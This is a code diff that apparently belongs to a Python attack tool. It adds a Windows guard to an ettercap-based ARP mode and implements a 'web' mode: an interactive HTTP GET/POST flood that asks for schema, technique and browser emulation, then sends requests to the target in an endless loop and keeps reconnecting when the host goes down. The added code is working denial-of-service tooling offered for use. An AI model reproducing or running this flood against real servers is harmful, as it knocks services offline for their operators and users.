@@ -372,6 +372,10 @@ It is very customizeable so it can suit your needs.
 
             elif values['attack_mode'].lower() == 'arp':
                 try:
+                    if os.name == 'nt':
+                        printer.Printer().print_with_status("This method is not available on Windows!", 2)
+                        return 10
+                    
                     if subprocess.getstatusoutput('which xterm')[0] == 0:
                         if subprocess.getstatusoutput('which ettercap')[0] == 0:
                             pass
@@ -444,9 +448,112 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
                     return 0
 
             elif values['attack_mode'].lower() == 'web':
-                printer.Printer().print_with_status("Not yet implemented.", 1)
-                return 0
-
+                print("[01] HTTP")
+                print("[02] HTTPS")
+                print()
+                while True:
+                    try:
+                        schema = int(input("What schema will we use? > "))
+                        if schema == 1:
+                            schema = 'http://'
+                            break
+    
+                        elif schema == 2:
+                            schema = 'https://'
+                            break
+    
+                        else:
+                            continue
+    
+                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
+                        continue
+    
+                try:
+                    print("Trying to connect to {0}{1}:{2}".format(schema, values['target'], values['port']))
+                    response = requests.get("{0}{1}:{2}".format(schema, values['target'], values['port']))
+                    if response.status_code == 200:
+                        pass
+                    
+                    else:
+                        printer.Printer().print_with_status(error.ErrorClass().ERROR0006(), 1)
+                        time.sleep(3)
+                        
+                    print("Response Code: {0}".format(str(response.status_code)))
+    
+                except BaseException as err:
+                    printer.Printer().print_with_status(str(err), 2)
+                    return 9
+                
+                print("[01] HTTP GET attack")
+                print("[02] HTTP POST attack")
+                print("[03] HTTP GET/POST attack")
+                http_get_mode = False
+                http_post_mode = False
+                while True:
+                    try:
+                        http_flood_mode = int(input("What technique will we use? > "))
+                        if http_flood_mode == 1:
+                            http_get_mode = True
+                            break
+                            
+                        elif http_flood_mode == 2:
+                            http_post_mode = True
+                            break
+                            
+                        elif http_flood_mode == 3:
+                            http_get_mode = True
+                            http_post_mode = True
+                            break
+                        
+                        else:
+                            continue
+                        
+                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
+                        continue
+                    
+                while True:
+                    try:
+                        browser_emulation = input("Enable Browser Emulation? (y/n) > ")
+                        if browser_emulation.lower() == 'y':
+                            browser_emulation = True
+                            break
+                        
+                        elif browser_emulation.lower() == 'n':
+                            browser_emulation = False
+                            break
+                        
+                        else:
+                            continue
+                        
+                        
+                    except(ValueError, TypeError, EOFError, KeyboardInterrupt):
+                        continue
+                        
+                while True:
+                    final_target = "{0}{1}:{2}".format(schema, values['target'], values['port'])
+                    printer.Printer().print_with_status("Starting Attack...", 0)
+                    printer.Printer().print_with_status("Press CTRL+C or CTRL+D to abort...", 1)
+                    if http_get_mode is True and http_post_mode is False:
+                        connection_stable = True
+                        while True:
+                            try:
+                                recv = requests.get(final_target)
+                                
+                            except(requests.exceptions.ConnectionError):
+                                printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
+                                connection_stable = False
+                                continue
+                            
+                            except(KeyboardInterrupt, EOFError):
+                                printer.Printer().print_with_status("Aborting...", 1)
+                                return 0
+                            
+                            else:
+                                if connection_stable is False:
+                                    printer.Printer().print_with_status("We are now connected!", 0)
+                                
+                                connection_stable = True
+                
             else:
                 printer.Printer().print_with_status("Invalid attack_mode!", 2)
                 return 5
@@ -542,6 +649,10 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
             except BaseException as err:
                 printer.Printer().print_with_status(str(err), 2)
                 return False
+            
+            else:
+                # print(response)  # DEV0005
+                return True
 
         else:
             printer.Printer().print_with_status("Unknown attack_mode! Aborting attack.", 2)
